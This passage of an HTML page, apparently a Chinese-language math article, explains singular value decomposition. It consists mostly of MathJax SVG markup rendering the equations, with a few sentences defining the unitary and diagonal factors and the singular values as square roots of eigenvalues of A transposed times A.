155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="TeXAtom" transform="translate(750, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(878, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1656, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2673, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(3728.8, 0)"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="TeXAtom" transform="translate(683, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(878, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1656, 0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g></g><g data-mml-node="msub" transform="translate(6001.2, 0)"><g data-mml-node="mi"><path data-c="3A3" d="M666 247Q664 244 652 126T638 4V0H351Q131 0 95 0T57 5V6Q54 12 57 17L73 36Q89 54 121 90T182 159L305 299L56 644L55 658Q55 677 60 681Q63 683 351 683H638V679Q640 674 652 564T666 447V443H626V447Q618 505 604 543T559 605Q529 626 478 631T333 637H294H189L293 494Q314 465 345 422Q400 346 400 340Q400 338 399 337L154 57Q407 57 428 58Q476 60 508 68T551 83T575 103Q595 125 608 162T624 225L626 251H666V247Z"></path></g><g data-mml-node="TeXAtom" transform="translate(722, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(521, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1299, 0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g></g><g data-mml-node="msubsup" transform="translate(8060.1, 0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mi" transform="translate(828.3, 413) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="TeXAtom" transform="translate(583, -257.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(521, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1299, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></g></g></svg><svg data-labels="true" preserveAspectRatio="xMaxYMid" viewBox="1278 -828.6 1 1157.2"><g data-labels="true" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mtd" id="mjx-eqn-4" transform="translate(0, -63.1)"><g data-mml-node="mtext"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(389, 0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(889, 0)"></path></g></g></g></svg></g></g></g></g></svg></mjx-container></span></p>
<p>其中，<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="1.735ex" height="1.595ex" role="img" focusable="false" viewBox="0 -683 767 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g></g></g></svg></mjx-container></span>是酉矩阵，<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="1.633ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 722 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="3A3" d="M666 247Q664 244 652 126T638 4V0H351Q131 0 95 0T57 5V6Q54 12 57 17L73 36Q89 54 121 90T182 159L305 299L56 644L55 658Q55 677 60 681Q63 683 351 683H638V679Q640 674 652 564T666 447V443H626V447Q618 505 604 543T559 605Q529 626 478 631T333 637H294H189L293 494Q314 465 345 422Q400 346 400 340Q400 338 399 337L154 57Q407 57 428 58Q476 60 508 68T551 83T575 103Q595 125 608 162T624 225L626 251H666V247Z"></path></g></g></g></svg></mjx-container></span>为对角矩阵，对角元的奇异值为<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.372ex" xmlns="http://www.w3.org/2000/svg" width="8.888ex" height="2.398ex" role="img" focusable="false" viewBox="0 -895.6 3928.5 1060"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path></g><g data-mml-node="mi" transform="translate(571, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1142.7, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msqrt" transform="translate(2198.5, 0)"><g transform="translate(853, 0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z"></path></g><g data-mml-node="mi" transform="translate(583, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mo" transform="translate(0, 35.6)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"></path></g><rect width="877" height="60" x="853" y="775.6"></rect></g></g></g></svg></mjx-container></span>，其中<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.984ex" height="1.927ex" role="img" focusable="false" viewBox="0 -694 877 851.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z"></path></g><g data-mml-node="mi" transform="translate(583, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span>为矩阵<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span>的特征值</p>
<p>为了方便，以下分析过程省略矩阵下标。</p>
<p>由于</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true" width="full" style="min-width: 24.715ex"><svg style="vertical-align: -0.726ex; min-width: 24.715ex" xmlns="http://www.w3.org/2000/svg" width="100%" height="2.583ex" role="img" focusable="false"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0) scale(0.0181) translate(0, -820.9)"><g data-mml-node="math"><g data-mml-node="mtable" transform="translate(2078, 0) translate(-2078, 0)"><g transform="translate(0 820.9) matrix(1 0 0 -1 0 0) scale(55.25)"><svg data-table="true" preserveAspectRatio="xMidYMid" viewBox="3384.1 -820.9 1 1141.7"><g transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mlabeledtr" transform="translate(0, -70.9)"><g data-mml-node="mtd"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389, 0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="msup" transform="translate(1139, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(750, 413) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g><g data-mml-node="mo" transform="translate(2436.8, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="msub" transform="translate(2825.8, 0)"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(572, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(3969.5, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(5025.3, 0)"><g data-mml-node="mi"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z"></path></g><g data-mml-node="mi" transform="translate(583, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="msub" transform="translate(5902.3, 0)"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 